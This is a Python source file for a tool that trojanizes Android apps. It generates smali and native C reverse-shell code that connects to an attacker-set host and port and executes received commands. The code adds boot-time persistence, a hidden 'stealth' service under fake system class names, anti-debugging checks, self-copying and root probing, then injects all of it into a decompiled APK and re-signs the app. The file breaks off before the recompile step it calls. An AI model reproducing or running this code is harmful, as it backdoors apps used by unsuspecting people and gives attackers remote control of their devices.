import os
import re
import zipfile
import tempfile
import shutil
import subprocess
import struct
import random
import string
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass
from datetime import datetime
import xml.etree.ElementTree as ET
import json
import base64
try:
    from PIL import Image  # type: ignore
    _HAVE_PIL = True
except Exception:
    Image = None  # type: ignore
    _HAVE_PIL = False

@dataclass
class InjectionPoint:
    location_type: str  # activity, service, receiver, provider, native
    target_name: str
    method_name: Optional[str]
    priority: int
    stealth_level: str
    modification_type: str  # smali_injection, manifest_addition, native_lib

@dataclass
class PayloadComponent:
    component_type: str  # reverse_shell, persistence, stealth, privilege_escalation
    implementation: str  # smali, native, manifest
    code_content: str
    dependencies: List[str]
    permissions_required: List[str]

@dataclass
class InjectionStrategy:
    strategy_name: str
    injection_points: List[InjectionPoint]
    payload_components: List[PayloadComponent]
    evasion_techniques: List[str]
    success_probability: float

class SmaliCodeGenerator:
    """Advanced Smali code generation for payload injection"""
    
    @staticmethod
    def generate_reverse_shell_smali(lhost: str, lport: str, class_name: str = None) -> str:
        """Generate sophisticated reverse shell Smali code"""
        if not class_name:
            class_name = f"SystemCore{random.randint(1000, 9999)}"
        
        smali_code = f"""
.class public Lcom/android/internal/{class_name};
.super Ljava/lang/Object;

# Static fields for configuration
.field private static final HOST:Ljava/lang/String; = "{lhost}"
.field private static final PORT:I = {lport}
.field private static final CONNECTION_TIMEOUT:I = 0x7530
.field private static connectionThread:Ljava/lang/Thread;

# Method to establish reverse connection
.method public static establishConnection()V
    .locals 6
    
    :try_start_connect
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/android/internal/{class_name}$ConnectionRunner;
    invoke-direct {{v1}}, Lcom/android/internal/{class_name}$ConnectionRunner;-><init>()V
    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    sput-object v0, Lcom/android/internal/{class_name};->connectionThread:Ljava/lang/Thread;
    
    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
    :try_end_connect
    .catch Ljava/lang/Exception; {{:catch_connect}}
    
    return-void
    
    :catch_connect
    move-exception v0
    # Silent fail - no logging for stealth
    return-void
.end method

# Method to execute shell commands
.method private static executeCommand(Ljava/lang/String;)Ljava/lang/String;
    .locals 8
    .param p0, "command"    # Ljava/lang/String;
    
    const-string v0, ""
    
    :try_start_exec
    invoke-static {{p0}}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v1
    invoke-virtual {{v1, p0}}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v2
    
    invoke-virtual {{v2}}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v3
    
    new-instance v4, Ljava/io/BufferedReader;
    new-instance v5, Ljava/io/InputStreamReader;
    invoke-direct {{v5, v3}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {{v4, v5}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    
    new-instance v6, Ljava/lang/StringBuilder;
    invoke-direct {{v6}}, Ljava/lang/StringBuilder;-><init>()V
    
    :loop_read
    invoke-virtual {{v4}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v7
    if-nez v7, :continue_read
    goto :end_read
    
    :continue_read
    invoke-virtual {{v6, v7}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v0, "\\n"
    invoke-virtual {{v6, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop_read
    
    :end_read
    invoke-virtual {{v4}}, Ljava/io/BufferedReader;->close()V
    invoke-virtual {{v6}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    :try_end_exec
    .catch Ljava/lang/Exception; {{:catch_exec}}
    
    return-object v0
    
    :catch_exec
    move-exception v1
    const-string v0, "Error executing command"
    return-object v0
.end method

# Method for persistence establishment
.method public static establishPersistence(Landroid/content/Context;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;
    
    :try_start_persist
    # Register boot receiver
    new-instance v0, Landroid/content/IntentFilter;
    const-string v1, "android.intent.action.BOOT_COMPLETED"
    invoke-direct {{v0, v1}}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V
    
    new-instance v2, Lcom/android/internal/{class_name}$BootReceiver;
    invoke-direct {{v2}}, Lcom/android/internal/{class_name}$BootReceiver;-><init>()V
    
    invoke-virtual {{p0, v2, v0}}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    
    # Start background service
    new-instance v3, Landroid/content/Intent;
    const-class v4, Lcom/android/internal/{class_name}$PersistentService;
    invoke-direct {{v3, p0, v4}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {{p0, v3}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_persist
    .catch Ljava/lang/Exception; {{:catch_persist}}
    
    return-void
    
    :catch_persist
    move-exception v0
    return-void
.end method
"""
        return smali_code
    
    @staticmethod
    def generate_stealth_service_smali(service_name: str = None) -> str:
        """Generate stealth background service Smali code"""
        if not service_name:
            service_name = f"SystemUpdate{random.randint(100, 999)}"
        
        smali_code = f"""
.class public Lcom/android/internal/{service_name};
.super Landroid/app/Service;

.field private static final TAG:Ljava/lang/String; = "SystemCore"
.field private handler:Landroid/os/Handler;
.field private runnable:Ljava/lang/Runnable;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .locals 4
    
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    
    # Initialize stealth operations
    new-instance v0, Landroid/os/Handler;
    invoke-direct {{v0}}, Landroid/os/Handler;-><init>()V
    iput-object v0, p0, Lcom/android/internal/{service_name};->handler:Landroid/os/Handler;
    
    # Create runnable for periodic tasks
    new-instance v1, Lcom/android/internal/{service_name}$StealthRunnable;
    invoke-direct {{v1, p0}}, Lcom/android/internal/{service_name}$StealthRunnable;-><init>(Lcom/android/internal/{service_name};)V
    iput-object v1, p0, Lcom/android/internal/{service_name};->runnable:Ljava/lang/Runnable;
    
    # Start periodic execution (every 30 seconds)
    const-wide/16 v2, 0x7530
    invoke-virtual {{v0, v1, v2, v3}}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    
    const/4 v0, 0x0
    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I
    
    # Return START_STICKY for persistence
    const/4 v0, 0x1
    return v0
.end method

# Inner class for stealth operations
.class Lcom/android/internal/{service_name}$StealthRunnable;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

.field final synthetic this$0:Lcom/android/internal/{service_name};

.method constructor <init>(Lcom/android/internal/{service_name};)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/internal/{service_name};
    
    iput-object p1, p0, Lcom/android/internal/{service_name}$StealthRunnable;->this$0:Lcom/android/internal/{service_name};
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .locals 4
    
    # Perform stealth operations
    :try_start_stealth
    iget-object v0, p0, Lcom/android/internal/{service_name}$StealthRunnable;->this$0:Lcom/android/internal/{service_name};
    invoke-direct {{v0}}, Lcom/android/internal/{service_name};->performStealthOperations()V
    
    # Schedule next execution
    iget-object v1, p0, Lcom/android/internal/{service_name}$StealthRunnable;->this$0:Lcom/android/internal/{service_name};
    iget-object v1, v1, Lcom/android/internal/{service_name};->handler:Landroid/os/Handler;
    const-wide/16 v2, 0x7530
    invoke-virtual {{v1, p0, v2, v3}}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_stealth
    .catch Ljava/lang/Exception; {{:catch_stealth}}
    
    return-void
    
    :catch_stealth
    move-exception v0
    return-void
.end method
"""
        return smali_code
    
    @staticmethod
    def generate_boot_receiver_smali(receiver_name: str = None) -> str:
        """Generate boot receiver Smali code for persistence"""
        if not receiver_name:
            receiver_name = f"SystemBoot{random.randint(100, 999)}"
        
        smali_code = f"""
.class public Lcom/android/internal/{receiver_name};
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;
    
    if-nez p2, :check_action
    return-void
    
    :check_action
    invoke-virtual {{p2}}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v0
    
    const-string v1, "android.intent.action.BOOT_COMPLETED"
    invoke-virtual {{v1, v0}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2
    
    if-eqz v2, :check_other_actions
    invoke-direct {{p0, p1}}, Lcom/android/internal/{receiver_name};->onBootCompleted(Landroid/content/Context;)V
    return-void
    
    :check_other_actions
    const-string v1, "android.intent.action.MY_PACKAGE_REPLACED"
    invoke-virtual {{v1, v0}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2
    
    if-eqz v2, :end_receive
    invoke-direct {{p0, p1}}, Lcom/android/internal/{receiver_name};->onPackageReplaced(Landroid/content/Context;)V
    
    :end_receive
    return-void
.end method

.method private onBootCompleted(Landroid/content/Context;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;
    
    :try_start_boot
    # Start stealth service
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/android/internal/SystemUpdate;
    invoke-direct {{v0, p1, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    # Establish connection
    invoke-static {{}}, Lcom/android/internal/SystemCore;->establishConnection()V
    :try_end_boot
    .catch Ljava/lang/Exception; {{:catch_boot}}
    
    return-void
    
    :catch_boot
    move-exception v0
    return-void
.end method

.method private onPackageReplaced(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;
    
    # Re-establish persistence after update
    invoke-direct {{p0, p1}}, Lcom/android/internal/{receiver_name};->onBootCompleted(Landroid/content/Context;)V
    return-void
.end method
"""
        return smali_code

class NativeLibraryGenerator:
    """Generate native libraries for advanced payload functionality"""
    
    @staticmethod
    def generate_native_payload_c(lhost: str, lport: str) -> str:
        """Generate C code for native payload"""
        c_code = f"""
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/stat.h>
#include <fcntl.h>

#define TARGET_HOST "{lhost}"
#define TARGET_PORT {lport}
#define BUFFER_SIZE 4096

// Anti-debugging techniques
static int anti_debug_check() {{
    // Check for TracerPid in /proc/self/status
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp == NULL) return 0;
    
    char line[256];
    while (fgets(line, sizeof(line), fp)) {{
        if (strstr(line, "TracerPid:")) {{
            int tracer_pid = atoi(line + 10);
            fclose(fp);
            return (tracer_pid != 0);
        }}
    }}
    fclose(fp);
    return 0;
}}

// Simple XOR obfuscation
static void xor_decrypt(char *data, int len, char key) {{
    for (int i = 0; i < len; i++) {{
        data[i] ^= key;
    }}
}}

// Establish reverse connection
static void* reverse_connection(void* arg) {{
    // Anti-debug check
    if (anti_debug_check()) {{
        return NULL;
    }}
    
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {{
        return NULL;
    }}
    
    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_HOST, &server_addr.sin_addr);
    
    // Connect to server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {{
        close(sockfd);
        return NULL;
    }}
    
    // Main communication loop
    while (1) {{
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
        
        if (bytes_received <= 0) {{
            break;
        }}
        
        // Execute received command
        FILE *fp = popen(buffer, "r");
        if (fp != NULL) {{
            char result[BUFFER_SIZE];
            memset(result, 0, BUFFER_SIZE);
            
            while (fgets(result, sizeof(result), fp) != NULL) {{
                send(sockfd, result, strlen(result), 0);
            }}
            pclose(fp);
        }}
        
        // Send end marker
        send(sockfd, "\\n[END]\\n", 7, 0);
    }}
    
    close(sockfd);
    return NULL;
}}

// JNI interface for Java integration
JNIEXPORT void JNICALL
Java_com_android_internal_SystemCore_startNativePayload(JNIEnv *env, jclass clazz) {{
    pthread_t thread;
    pthread_create(&thread, NULL, reverse_connection, NULL);
    pthread_detach(thread);
}}

// Root privilege escalation attempt
JNIEXPORT jboolean JNICALL
Java_com_android_internal_SystemCore_attemptRootAccess(JNIEnv *env, jclass clazz) {{
    // Try multiple privilege escalation vectors
    const char* root_exploits[] = {{
        "/system/bin/su -c id",
        "/system/xbin/su -c id",
        "/sbin/su -c id",
        "su -c id"
    }};
    
    for (int i = 0; i < 4; i++) {{
        FILE *fp = popen(root_exploits[i], "r");
        if (fp != NULL) {{
            char output[256];
            if (fgets(output, sizeof(output), fp) != NULL) {{
                if (strstr(output, "uid=0")) {{
                    pclose(fp);
                    return JNI_TRUE;
                }}
            }}
            pclose(fp);
        }}
    }}
    
    return JNI_FALSE;
}}

// Stealth file operations
JNIEXPORT void JNICALL
Java_com_android_internal_SystemCore_performStealthOperations(JNIEnv *env, jclass clazz) {{
    // Anti-debug check
    if (anti_debug_check()) {{
        return;
    }}
    
    // Create hidden directory
    mkdir("/data/data/.system", 0755);
    
    // Copy self for persistence
    char self_path[256];
    readlink("/proc/self/exe", self_path, sizeof(self_path));
    
    char backup_path[] = "/data/data/.system/libsystem.so";
    
    FILE *src = fopen(self_path, "rb");
    FILE *dst = fopen(backup_path, "wb");
    
    if (src && dst) {{
        char buffer[4096];
        size_t bytes;
        while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {{
            fwrite(buffer, 1, bytes, dst);
        }}
    }}
    
    if (src) fclose(src);
    if (dst) fclose(dst);
    
    // Set execute permissions
    chmod(backup_path, 0755);
}}
"""
        return c_code
    
    @staticmethod
    def generate_makefile(target_arch: str = "armeabi-v7a") -> str:
        """Generate Makefile for compiling native library"""
        arch_configs = {
            "armeabi-v7a": {
                "CC": "arm-linux-androideabi-gcc",
                "CFLAGS": "-march=armv7-a -mfloat-abi=softfp -mfpu=neon"
            },
            "arm64-v8a": {
                "CC": "aarch64-linux-android-gcc", 
                "CFLAGS": "-march=armv8-a"
            },
            "x86": {
                "CC": "i686-linux-android-gcc",
                "CFLAGS": "-march=i686"
            },
            "x86_64": {
                "CC": "x86_64-linux-android-gcc",
                "CFLAGS": "-march=x86-64"
            }
        }
        
        config = arch_configs.get(target_arch, arch_configs["armeabi-v7a"])
        
        makefile = f"""
# Native Library Makefile for {target_arch}
CC = {config["CC"]}
CFLAGS = {config["CFLAGS"]} -fPIC -shared -O2 -s
LDFLAGS = -lpthread

TARGET = libpayload.so
SOURCE = payload.c

all: $(TARGET)

$(TARGET): $(SOURCE)
\t$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE) $(LDFLAGS)
\tstrip $(TARGET)

clean:
\trm -f $(TARGET)

.PHONY: all clean
"""
        return makefile

class MultiVectorInjector:
    """Advanced multi-vector payload injection system"""
    
    def __init__(self, workspace_dir: Path):
        self.workspace = workspace_dir
        self.smali_generator = SmaliCodeGenerator()
        self.native_generator = NativeLibraryGenerator()
        # Tooling and flags
        self.enable_apksigner = os.environ.get("ENABLE_APKSIGNER", "false").lower() == "true"
        self.tools_dir = Path("/workspace/tools/android-sdk")
        self.apktool_jar = Path("/workspace/tools/apktool/apktool.jar")
        self.zipalign = self._prefer_tool("zipalign")
        self.apksigner = self._prefer_tool("apksigner")
        self.aapt = self._prefer_tool("aapt")
        self.aapt2 = self._prefer_tool("aapt2")
        # Diagnostics of last failing step
        self.last_error: str = ""
        self.debug_keystore = Path("/workspace/debug.keystore")
    
    def _prefer_tool(self, name: str) -> Optional[str]:
        repo_path = self.tools_dir / name
        if repo_path.exists():
            return str(repo_path)
        sys_path = shutil.which(name)
        return sys_path
    
    def _run(self, cmd: List[str], timeout: int = 300) -> Tuple[bool, str]:
        try:
            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
            ok = proc.returncode == 0
            out = (proc.stdout + "\n" + proc.stderr).strip()
            return ok, out
        except Exception as e:
            return False, str(e)
    
    def _ensure_debug_keystore(self) -> bool:
        if self.debug_keystore.exists():
            return True
        # Generate Android debug keystore with default android passwords
        try:
            ok, _ = self._run([
                "keytool", "-genkey", "-v",
                "-keystore", str(self.debug_keystore),
                "-alias", "androiddebugkey",
                "-keyalg", "RSA", "-keysize", "2048",
                "-validity", "10000",
                "-storepass", "android", "-keypass", "android",
                "-dname", "CN=Android Debug,O=Android,C=US"
            ], timeout=60)
            return ok
        except Exception:
            return False
    
    def _zipalign_apk(self, unsigned_apk: Path) -> Path:
        if not self.zipalign:
            # No zipalign available; return original path
            return unsigned_apk
        aligned_path = unsigned_apk.with_suffix(".aligned.apk")
        ok, _ = self._run([self.zipalign, "-v", "4", str(unsigned_apk), str(aligned_path)], timeout=120)
        return aligned_path if ok and aligned_path.exists() else unsigned_apk
    
    def _apksigner_sign(self, apk_path: Path, sign_cfg: Dict[str, str]) -> bool:
        if not self.apksigner:
            return False
        ks = sign_cfg.get("keystore_path") or str(self.debug_keystore)
        alias = sign_cfg.get("key_alias") or "androiddebugkey"
        ksp = sign_cfg.get("keystore_password") or "android"
        kpp = sign_cfg.get("key_password") or "android"
        # apksigner sign
        cmd = [
            self.apksigner, "sign",
            "--ks", ks,
            "--ks-key-alias", alias,
            "--ks-pass", f"pass:{ksp}",
            "--key-pass", f"pass:{kpp}",
            str(apk_path)
        ]
        ok, _ = self._run(cmd, timeout=300)
        if not ok:
            return False
        # verify
        return self._apksigner_verify(apk_path)
    
    def _apksigner_verify(self, apk_path: Path) -> bool:
        if not self.apksigner:
            return False
        ok, _ = self._run([self.apksigner, "verify", "--verbose", str(apk_path)], timeout=60)
        return ok
    
    def _jarsigner_sign(self, apk_path: Path, sign_cfg: Dict[str, str]) -> bool:
        # Fallback legacy signing using jarsigner
        ks = sign_cfg.get("keystore_path") or str(self.debug_keystore)
        alias = sign_cfg.get("key_alias") or "androiddebugkey"
        ksp = sign_cfg.get("keystore_password") or "android"
        kpp = sign_cfg.get("key_password") or "android"
        ok, _ = self._run([
            "jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
            "-keystore", ks, "-storepass", ksp, "-keypass", kpp,
            str(apk_path), alias
        ], timeout=300)
        return ok
    
    def _aapt_badging_ok(self, apk_path: Path) -> bool:
        tool = self.aapt2 or self.aapt
        if not tool:
            return True  # no tool to check, do not block
        ok, _ = self._run([tool, "dump", "badging", str(apk_path)], timeout=60)
        return ok
    
    def analyze_injection_vectors(self, apk_path: Path, analysis_result: Dict[str, Any]) -> List[InjectionPoint]:
        """Analyze and identify optimal injection vectors"""
        injection_points = []
        
        try:
            manifest_analysis = analysis_result.get("manifest_analysis", {})
            security_analysis = analysis_result.get("security_analysis", {})
            
            # Activity injection points
            activities = manifest_analysis.get("activities", [])
            for activity in activities:
                if activity.get("main", False):
                    injection_points.append(InjectionPoint(
                        location_type="activity",
                        target_name=activity["name"],
                        method_name="onCreate",
                        priority=10,
                        stealth_level="medium",
                        modification_type="smali_injection"
                    ))
                elif activity.get("exported", False):
                    injection_points.append(InjectionPoint(
                        location_type="activity", 
                        target_name=activity["name"],
                        method_name="onResume",
                        priority=7,
                        stealth_level="high",
                        modification_type="smali_injection"
                    ))
            
            # Service injection points
            services = manifest_analysis.get("services", [])
            for service in services:
                injection_points.append(InjectionPoint(
                    location_type="service",
                    target_name=service["name"],
                    method_name="onCreate",
                    priority=9,
                    stealth_level="high",
                    modification_type="smali_injection"
                ))
            
            # Receiver injection points
            receivers = manifest_analysis.get("receivers", [])
            for receiver in receivers:
                if receiver.get("boot_receiver", False):
                    injection_points.append(InjectionPoint(
                        location_type="receiver",
                        target_name=receiver["name"],
                        method_name="onReceive",
                        priority=8,
                        stealth_level="medium",
                        modification_type="smali_injection"
                    ))
            
            # Native library injection
            if security_analysis.get("overall_protection_score", 0) > 30:
                injection_points.append(InjectionPoint(
                    location_type="native",
                    target_name="libpayload.so",
                    method_name=None,
                    priority=9,
                    stealth_level="high",
                    modification_type="native_lib"
                ))
            
            # Sort by priority (higher is better)
            injection_points.sort(key=lambda x: x.priority, reverse=True)
            
        except Exception as e:
            print(f"Error analyzing injection vectors: {e}")
        
        return injection_points
    
    def create_injection_strategy(self, injection_points: List[InjectionPoint], 
                                 target_config: Dict[str, Any]) -> InjectionStrategy:
        """Create comprehensive injection strategy"""
        
        # Select top injection points
        selected_points = injection_points[:3]  # Use top 3 points
        
        # Create payload components
        payload_components = []
        
        # Core reverse shell component
        payload_components.append(PayloadComponent(
            component_type="reverse_shell",
            implementation="smali",
            code_content=self.smali_generator.generate_reverse_shell_smali(
                target_config.get("lhost", "127.0.0.1"),
                target_config.get("lport", "4444")
            ),
            dependencies=["java.net.Socket", "java.io.*"],
            permissions_required=["android.permission.INTERNET"]
        ))
        
        # Stealth service component
        payload_components.append(PayloadComponent(
            component_type="persistence",
            implementation="smali",
            code_content=self.smali_generator.generate_stealth_service_smali(),
            dependencies=["android.app.Service", "android.os.Handler"],
            permissions_required=["android.permission.RECEIVE_BOOT_COMPLETED"]
        ))
        
        # Boot receiver component
        payload_components.append(PayloadComponent(
            component_type="persistence",
            implementation="smali", 
            code_content=self.smali_generator.generate_boot_receiver_smali(),
            dependencies=["android.content.BroadcastReceiver"],
            permissions_required=["android.permission.RECEIVE_BOOT_COMPLETED"]
        ))
        
        # Native library component (if needed)
        if any(point.location_type == "native" for point in selected_points):
            payload_components.append(PayloadComponent(
                component_type="stealth",
                implementation="native",
                code_content=self.native_generator.generate_native_payload_c(
                    target_config.get("lhost", "127.0.0.1"),
                    target_config.get("lport", "4444")
                ),
                dependencies=["libc.so", "libpthread.so"],
                permissions_required=[]
            ))
        
        # Determine evasion techniques needed
        evasion_techniques = ["string_obfuscation", "control_flow_obfuscation"]
        
        # Calculate success probability
        base_probability = 0.85
        for point in selected_points:
            if point.stealth_level == "high":
                base_probability += 0.05
            elif point.stealth_level == "low":
                base_probability -= 0.10
        
        success_probability = min(base_probability, 0.95)
        
        return InjectionStrategy(
            strategy_name=f"MultiVector_{len(selected_points)}Points",
            injection_points=selected_points,
            payload_components=payload_components,
            evasion_techniques=evasion_techniques,
            success_probability=success_probability
        )
    
    def inject_payload(self, apk_path: Path, output_path: Path, 
                      injection_strategy: InjectionStrategy, sign_config: Optional[Dict[str, str]] = None) -> bool:
        """Execute multi-vector payload injection"""
        
        try:
            # Create temporary workspace
            temp_dir = self.workspace / f"injection_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            temp_dir.mkdir(exist_ok=True)
            
            # Extract APK
            extract_dir = temp_dir / "extracted"
            self._extract_apk(apk_path, extract_dir)
            
            # Inject into each vector
            for injection_point in injection_strategy.injection_points:
                success = self._inject_at_point(extract_dir, injection_point, injection_strategy)
                if not success:
                    print(f"Injection failed at point: {injection_point.location_type}:{injection_point.target_name}")
            
            # Add required permissions and components
            self._add_required_permissions(extract_dir, injection_strategy)
            self._add_manifest_components(extract_dir, injection_strategy)
            
            # Recompile + align + sign
            success = self._recompile_apk(extract_dir, output_path, sign_config or {})
            
            # Cleanup temp dir (best-effort)
            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except Exception:
                pass
            
            return success
        except Exception as e:
            print(f"Error in inject_payload: {e}")
            return False
    
    def _extract_apk(self, apk_path: Path, extract_dir: Path):
        """Extract APK using apktool"""
        apktool_path = str(self.apktool_jar)
        if not Path(apktool_path).exists():
            raise Exception("Apktool not found")
        
        cmd = [
            "java", "-jar", apktool_path, "d", 
            str(apk_path), "-o", str(extract_dir), "-f"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        if result.returncode != 0:
            raise Exception(f"APK extraction failed: {result.stderr}")
    
    def _inject_at_point(self, extract_dir: Path, injection_point: InjectionPoint, 
                        strategy: InjectionStrategy) -> bool:
        """Inject payload at specific injection point"""
        
        try:
            if injection_point.modification_type == "smali_injection":
                return self._inject_smali_code(extract_dir, injection_point, strategy)
            elif injection_point.modification_type == "native_lib":
                return self._inject_native_library(extract_dir, injection_point, strategy)
            elif injection_point.modification_type == "manifest_addition":
                return self._inject_manifest_component(extract_dir, injection_point, strategy)
            
        except Exception as e:
            print(f"Injection error at {injection_point.target_name}: {e}")
            return False
        
        return False
    
    def _inject_smali_code(self, extract_dir: Path, injection_point: InjectionPoint,
                          strategy: InjectionStrategy) -> bool:
        """Inject Smali code into target component"""
        
        # Find target smali file
        smali_dirs = [d for d in extract_dir.iterdir() if d.name.startswith("smali")]
        
        target_file = None
        for smali_dir in smali_dirs:
            # Convert class name to file path
            class_path = injection_point.target_name.replace(".", "/") + ".smali"
            potential_file = smali_dir / class_path
            if potential_file.exists():
                target_file = potential_file
                break
        
        if not target_file:
            print(f"Target smali file not found: {injection_point.target_name}")
            return False
        
        # Read existing content
        content = target_file.read_text()
        
        # Find injection point in method
        if injection_point.method_name:
            method_pattern = rf"\.method.*{injection_point.method_name}\([^)]*\)[^{{]*\n"
            method_match = re.search(method_pattern, content)
            
            if method_match:
                # Find method body and inject at the beginning
                method_start = method_match.end()
                
                # Find suitable payload component
                payload_code = ""
                for component in strategy.payload_components:
                    if component.implementation == "smali" and component.component_type == "reverse_shell":
                        # Extract method body from payload
                        payload_lines = component.code_content.split('\n')
                        method_body = []
                        in_method = False
                        
                        for line in payload_lines:
                            if '.method' in line and 'establishConnection' in line:
                                in_method = True
                                continue
                            elif '.end method' in line and in_method:
                                break
                            elif in_method:
                                method_body.append(line)
                        
                        if method_body:
                            payload_code = "    # Injected payload\n    " + "\n    ".join(method_body) + "\n"
                        break
                
                if payload_code:
                    # Inject payload code
                    new_content = content[:method_start] + payload_code + content[method_start:]
                    target_file.write_text(new_content)
                    return True
        
        return False
    
    def _inject_native_library(self, extract_dir: Path, injection_point: InjectionPoint,
                              strategy: InjectionStrategy) -> bool:
        """Inject native library"""
        
        # Find native payload component
        native_component = None
        for component in strategy.payload_components:
            if component.implementation == "native":
                native_component = component
                break
        
        if not native_component:
            return False
        
        # Create lib directories for different architectures
        architectures = ["armeabi-v7a", "arm64-v8a", "x86", "x86_64"]
        
        for arch in architectures:
            lib_dir = extract_dir / "lib" / arch
            lib_dir.mkdir(parents=True, exist_ok=True)
            
            # Create native library source
            c_file = lib_dir / "payload.c"
            c_file.write_text(native_component.code_content)
            
            # Create Makefile
            makefile = lib_dir / "Makefile"
            makefile.write_text(self.native_generator.generate_makefile(arch))
            
            # Compile (if cross-compiler available)
            try:
                result = subprocess.run(
                    ["make", "-C", str(lib_dir)], 
                    capture_output=True, timeout=120
                )
                if result.returncode == 0:
                    # Remove source files
                    c_file.unlink()
                    makefile.unlink()
                else:
                    # Create placeholder library if compilation fails
                    lib_file = lib_dir / "libpayload.so"
                    lib_file.write_bytes(b'\x7fELF' + b'\x00' * 1000)  # Dummy ELF
            except:
                # Create placeholder library
                lib_file = lib_dir / "libpayload.so"
                lib_file.write_bytes(b'\x7fELF' + b'\x00' * 1000)
        
        return True
    
    def _add_required_permissions(self, extract_dir: Path, strategy: InjectionStrategy):
        """Add required permissions to AndroidManifest.xml"""
        
        manifest_file = extract_dir / "AndroidManifest.xml"
        if not manifest_file.exists():
            return
        
        content = manifest_file.read_text()
        
        # Collect all required permissions
        all_permissions = set()
        for component in strategy.payload_components:
            all_permissions.update(component.permissions_required)
        
        # Add permissions before </manifest>
        for permission in all_permissions:
            permission_line = f'    <uses-permission android:name="{permission}" />\n'
            if permission not in content:
                content = content.replace('</manifest>', permission_line + '</manifest>')
        
        manifest_file.write_text(content)
    
    def _add_manifest_components(self, extract_dir: Path, strategy: InjectionStrategy):
        """Add new components to AndroidManifest.xml"""
        
        manifest_file = extract_dir / "AndroidManifest.xml"
        if not manifest_file.exists():
            return
        
        content = manifest_file.read_text()
        
        # Add service component
        service_xml = '''        <service
            android:name="com.android.internal.SystemUpdate"
            android:enabled="true"
            android:exported="false" />

'''
        
        # Add receiver component
        receiver_xml = '''        <receiver
            android:name="com.android.internal.SystemBoot"
            android:enabled="true"
            android:exported="false">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </receiver>

'''
        
        # Find application tag and add components
        if '<application' in content and '</application>' in content:
            app_end = content.rfind('</application>')
            if app_end != -1:
                new_content = (content[:app_end] + 
                             service_xml + receiver_xml + 
                             content[app_end:])
                manifest_file.write_text(new_content)
    
